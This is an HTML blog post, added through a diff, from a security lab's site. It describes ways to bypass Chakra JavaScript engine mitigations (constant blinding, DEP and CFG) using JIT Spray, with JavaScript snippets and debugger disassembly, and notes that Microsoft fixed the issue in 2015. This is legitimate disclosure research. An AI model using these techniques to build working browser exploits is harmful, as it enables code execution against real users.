@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/en/css/style.css" type="text/css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header_top">
+    <div id="tencent_logo">
+    </div>
+    <div id="header_version">
+        <ul id="language_nav">
+          <li class="language_li"><a class="version_a" href="/cn">中文</a></li>
+          <li class="sep"><a class="version_a"> |&nbsp;&nbsp;  </a></li>
+          <li class="language_li"><a class="version_a" href="/en"> English</a></li>
+        </ul>
+    </div>
+  </div>
+
+  <div id="header_nav">
+    <div id="xuanwulab_logo"></div>
+    <!-- 
+    <div id="mobile-menu" >
+        <a class="nav-icon" id="main-nav-toggle"></a> 
+    </div>
+    -->
+    <div id="main_nav">
+        <a class="nav-icon" id="main-nav-toggle"></a> 
+        <ul id="menu_ul">
+        
+        <li id="menu_item">
+            <a class="navi" href="/en">Home</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/en/advisories">Advisories</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/en/policy">Disclosure Policy</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/en/archives">Archives</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/en/about/index.html">About</a>
+        </li>
+        
+        </ul>
+    </div>
+  </div>
+
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Bypass DEP and CFG using JIT compiler in Chakra engine
+    </h1>
+  
+
+
+      </header>
+       <div class="article-sum-time">
+            <p>By <span class="author">tombkeeper</span> on 
+            9 Dec 2015
+            </p>
+       </div>
+    
+    <div class="article-entry" itemprop="articleBody">
+        <p>JIT Spray is a popular exploitation technique first appeared in 2010. It embeds shellcode as immediate value into the executable code the JIT compiler generates. Currently, all major JIT engine, including Chakra, already have many mitigations in place against this technique, such as random NOP instruction insertion, constant blinding, etc.</p>
+<p>This article points out two weaknesses in Chakra’s JIT Spray mitigation (in Windows 8.1 and older operating systems, and Windows 10, respectively), allowing attackers to use JIT Spray to execute shellcode, bypassing DEP. I will also discuss a method to bypass CFG using Chakra’s JIT compiler.<br><a id="more"></a></p>
+<h2 id="0x01_Constant_Blinding">0x01 Constant Blinding</h2><p>Constant Blinding is the most important mitigation strategy against JIT Spray. Chakra engine use a randomly generated key to XOR every user inputted immediate value that is not 0x0000 or 0xFFFF, and decrypts it on the fly. For example, the following JavaScript:</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Generates machine code like this:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">096b0091 ba555593c5      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0C5935555h</span></span><br><span class="line">096b0096 81f2c5c50355    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">5503C5C5h</span></span><br><span class="line">096b009c 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b009e bab045edfb      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0FBED45B0h</span></span><br><span class="line">096b00a3 81f220d57d6b    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">6B7DD520h</span></span><br><span class="line">096b00a9 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b00ab baef85f139      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">39F185EFh</span></span><br><span class="line">096b00b0 81f27f1561a9    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">0A961157Fh</span></span><br><span class="line">096b00b6 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>The immediate value in the resulting machine code is unpredictable, thus shellcode embedding is not possible.</p>
+<h2 id="0x02_Bypass_Chakra’s_Constant_Blinding_on_Windows_8-1_or_Older_Operating_Systems">0x02 Bypass Chakra’s Constant Blinding on Windows 8.1 or Older Operating Systems</h2><p>Internally, for integer n, it is stored as n*2+1 by Chakra engine. When evaluating the expression n=n+m, it is not necessary to restore the original value of n before adding m, its result can be obtained by directly adding m*2 to n*2+1. Chakra engine on Windows 8.1 and older operating systems treat m*2 as self-generated data rather than user input, so constant blinding does not apply. For the following JavaScript code:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>When some conditions are met, could generate machine code like this:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">05010090</span> <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">05010096</span> <span class="number">0f</span>80d6010000    jo      <span class="number">05010272</span></span><br><span class="line"><span class="number">0501009</span>c <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">0501009</span>e <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>a1 f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>a4 <span class="number">0f</span>8413020000    je      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>aa <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line"><span class="number">050100</span>ac <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">050100</span>b2 <span class="number">0f</span>8005020000    jo      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>b8 <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">050100</span>ba <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>bd f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>c0 <span class="number">0f</span>8442020000    je      <span class="number">05010308</span></span><br><span class="line"><span class="number">050100</span>c6 <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">05010090</span> + <span class="number">2</span> l <span class="number">3</span></span><br><span class="line"><span class="number">05010092</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010093</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010094</span> eb18            jmp     <span class="number">050100</span>ae</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">050100</span>ae l <span class="number">3</span></span><br><span class="line"><span class="number">050100</span>ae <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>af <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>b0 eb18            jmp     <span class="number">050100</span>ca</span><br></pre></td></tr></table></figure>
+<p>If we could make each instruction in our shellcode not larger than 2 bytes, it could be embedded in the immediate value. The actual immediate value is 2 times of the value in JavaScript, so the first byte must be an even number if we use a 2-byte instruction, which is not very hard to satisfy.</p>
+<h2 id="0x03_Bypass_Chakra’s_Constant_Blinding_on_Windows_10">0x03 Bypass Chakra’s Constant Blinding on Windows 10</h2><p>Chakra engine on Windows 10 does not suffer from this issue. But in order to generate highly optimized code, when writing to an integer array, the following JavaScript code:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var ar = <span class="keyword">new</span> Uint16Array(<span class="number">0x10000</span>);</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Generates the following machine code:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0b8110e0 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110e9 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110f2 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110fb 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>To mitigate against JIT Spray, Chakra only allows user to control at most 2 bytes of immediate value. But in this specific situation, the array index and the value being written appear in one instruction. Now we can control 4 bytes instead of 2 bytes of data.</p>
+<p>Previously discussed 2-byte shellcode can also be used here. Due to the additional 2-byte 0x00 (which will be interpreted as “add byte ptr[eax], al”), we need to make the eax point to a writable location in the first two instruction.</p>
+<h2 id="0x04_Using_Chakra_Engine_to_Bypass_CFG">0x04 Using Chakra Engine to Bypass CFG</h2><p>By using previously discussed methods, we can do a JIT Spray to bypass DEP, but the shellcode entry point address embedded in the JIT’d code obviously cannot pass the CFG check. But actually, there are implementation flaws in Chakra engine itself that can be exploited to bypass CFG.</p>
+<p>There is a fixed entry point function that always gets generated regardless of the need of JIT of the currently executing JavaScript code:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; uf 4ff0000</span><br><span class="line">04ff0000 <span class="number">55</span>          <span class="keyword">push</span>  <span class="literal">ebp</span></span><br><span class="line">04ff0001 8bec        <span class="keyword">mov</span>   <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">04ff0003 8b4508      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff0006 8b4014      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">14h</span>]</span><br><span class="line">04ff0009 8b4840      <span class="keyword">mov</span>   <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">40h</span>]</span><br><span class="line">04ff000c 8d4508      <span class="keyword">lea</span>   <span class="literal">eax</span>,[<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff000f <span class="number">50</span>          <span class="keyword">push</span>  <span class="literal">eax</span></span><br><span class="line">04ff0010 b840cb5a71  <span class="keyword">mov</span>   <span class="literal">eax</span>, <span class="number">715acb40h</span> <span class="comment">; jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;</span></span><br><span class="line">04ff0015 ffe1        <span class="keyword">jmp</span>   <span class="literal">ecx</span></span><br></pre></td></tr></table></figure>
+<p>This function address can pass the CFG check. Also, before jmp ecx, there is no CFG check of the target address. This can be used as a trampoline for jumping to arbitrary address. We will call it “cfgJumper” hereafter.</p>
+<h2 id="0x05_Locating_JIT_Memory_and_cfgJumper">0x05 Locating JIT Memory and cfgJumper</h2><p>Locating the JIT compiled code and the cfgJumper are needed if we want to use JIT Spray to bypass DEP and use cfgJumper to bypass CFG. Interestingly, the method of locating both are almost identical.</p>
+<p>Every JavaScript function has a corresponding Js::ScriptFunction object. Every Js::ScriptFunction object also includes a Js::FunctionBody object. Inside this Js::FunctionObject object, a function pointer to the actual function entry point is stored.</p>
+<p>If a function is never called, this function pointer points to Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@........... <span class="comment">// Js::ScriptFunction</span></span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">70181720</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o ..p........ <span class="comment">// Js::FunctionBody</span></span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">70181720</span> l <span class="number">1</span></span><br><span class="line">Chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</span><br><span class="line"><span class="number">70181720</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>
+<p>If a function has been called before, but never compiled into JIT’d code, this function pointer points to cfgJumper: </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00860000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00860000</span></span><br><span class="line"><span class="number">00860000</span> <span class="number">55</span>          push  ebp</span><br><span class="line"><span class="number">00860001</span> <span class="number">8</span>bec        mov   ebp,esp</span><br><span class="line"><span class="number">00860003</span> <span class="number">8</span>b4508      mov   eax,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">00860006</span> <span class="number">8</span>b4014      mov   eax,dword ptr [eax+<span class="number">14</span>h]</span><br><span class="line"><span class="number">00860009</span> <span class="number">8</span>b4840      mov   ecx,dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">0086000</span>c <span class="number">8</span>d4508      lea   eax,[ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0086000f</span> <span class="number">50</span>          push  eax</span><br><span class="line"><span class="number">00860010</span> b800240870  mov   <span class="number">70082400</span>h ; Chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br><span class="line"><span class="number">00860015</span> ffe1        jmp   ecx</span><br></pre></td></tr></table></figure>
+<p>If a function is regularly called and Chakra compiles it into JIT’d code, this function pointer points to the actual code: </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b89de70 l8</span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b8d0000 l8</span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00950000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00950000</span></span><br><span class="line"><span class="number">00950000</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">00950001</span> <span class="number">8</span>bec            mov     ebp,esp</span><br><span class="line"><span class="number">00950003</span> <span class="number">81f</span>c44c9120b    cmp     esp,<span class="number">0</span>B12C944h</span><br><span class="line"><span class="number">00950009</span> <span class="number">7f</span>18            jg      <span class="number">00950023</span></span><br><span class="line"><span class="number">0095000</span>b <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000f</span> <span class="number">68e0</span>c72c07      push    <span class="number">72</span>CC7E0h</span><br><span class="line"><span class="number">00950014</span> <span class="number">6844090000</span>      push    <span class="number">944</span>h</span><br></pre></td></tr></table></figure>
+<p>With understandings of the internal structure of Js::ScriptFunction and Js::FunctionBody, we could precisely locate the JIT’d code and the cfgJumper.</p>
+<h2 id="0x06_Avoiding_Randomly_Inserted_NOP_instructions">0x06 Avoiding Randomly Inserted NOP instructions</h2><p>Other than constant blinding, Chakra engine also employs randomized NOP instruction insertion to mitigate JIT Spray. But the density of the insertion is rather low. Testing code combines 29 16-bit number to form a shellcode, only 29 x86 instructions are generated on Windows 10, with virtually no NOP instruction inserted in between. But in the exploitation method used on Windows 8.1 and older operating systems, about 200 x86 instruction are generated, and highly likely to contain NOP instructions.</p>
+<p>To solve this problem:</p>
+<ol>
+<li>Create a new script tag, put in a JavaScript function that contains JIT shellcode.</li>
+<li>Call this function in a loop to trigger JIT compilation.</li>
+<li>Read in compiled code to determine if there is any NOP instruction inserted.</li>
+<li>If any, destroy the script tag and repeat this procedure.</li>
+</ol>
+<p>Testing environments are Windows 8.1 with all updates till May 2015 and Windows 10 TP 9926.<br>Microsoft informed me that it has been fixed in September 2015.</p>
+
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://xlab.tencent.com/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine/" data-id="cii8hhw76000370un3gp5ohys" class="article-share-link"></a>
+      
+      
+  <span class="tags">Tags:&nbsp;&nbsp;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/en/tags/CFG/">CFG</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/en/tags/Chakra/">Chakra</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/en/tags/DEP/">DEP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/en/tags/JIT/">JIT</a></li></ul>
+
+
+    </footer>
+  </div>
+</article>
+
+
+</section>
+        <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <hr>
+    <div class="widget tagcloud">
+      <a href="/en/tags/CFG/" style="font-size: 10px;">CFG</a> <a href="/en/tags/Chakra/" style="font-size: 10px;">Chakra</a> <a href="/en/tags/DEP/" style="font-size: 10px;">DEP</a> <a href="/en/tags/JIT/" style="font-size: 20px;">JIT</a> <a href="/en/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/en/tags/RowHammer/" style="font-size: 10px;">RowHammer</a> <a href="/en/tags/Sandbox/" style="font-size: 10px;">Sandbox</a> <a href="/en/tags/Vulnerability/" style="font-size: 10px;">Vulnerability</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <hr>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/en/archives/2015/12/">December 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/en/archives/2015/08/">August 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/en/archives/2015/06/">June 2015</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <hr>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine/">Bypass DEP and CFG using JIT compiler in Chakra engine</a>
+          </li>
+        
+          <li>
+            <a href="/en/2015/08/27/Poking-a-Hole-in-the-Patch/">Poking a Hole in the Patch--Escaping from IE Sandbox with a Poorly Patched Vulnerability</a>
+          </li>
+        
+          <li>
+            <a href="/en/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/">Research report on using JIT to trigger RowHammer</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+      </div>
+      <footer id="footer">
+  <div id="outer">
+    <div id="footer-infoi" >
+        <div id="us">
+            <ul id="us_ul">
+            
+                <li id="follow_us" class="us_li"><p>Follow us: </p></li>
+                
+                <li class="us_li">
+                <a class="social_icon_twitter" href="https://twitter.com/xuanwulab" target="_blank">
+                <img class="social_icon_img_twitter" src="/en/css/images/twitter_chose.png" />
+                </a>
+                </li>
+                
+                <li class="us_li">
+                <a class="social_icon_weibo" href="http://weibo.com/xuanwulab" target="_blank">
+                <img class="social_icon_img_weibo" src="/en/css/images/weibo_chose.png" />
+                </a>
+                </li>
+                
+                <li class="us_li">
+                <a class="social_icon_rss" href="/en/atom.xml" target="_blank">
+                <img class="social_icon_img_rss" src="/en/css/images/rss_chose.png" />
+                </a>
+                </li>
+                
+                <li class="us_li">
+                <a class="social_icon_rss1" href="/en/advisories/atom.xml" target="_blank">
+                <img class="social_icon_img_rss1" src="/en/css/images/rss1_chose.png" />
+                </a>
+                </li>
+                
+            </ul>
+        </div>
+        <div id="copyright"><p>Copyright &copy; 2015 Tencent's XuanwuLab. All Rights Reserved.<p></div>
+  </>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/en" class="mobile-nav-link">Home</a>
+  
+    <a href="/en/advisories" class="mobile-nav-link">Advisories</a>
+  
+    <a href="/en/policy" class="mobile-nav-link">Disclosure Policy</a>
+  
+    <a href="/en/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/en/about/index.html" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/en/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/en/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/en/js/script.js" type="text/javascript"></script>
+ 
+  </div>
+</body>
+</html>
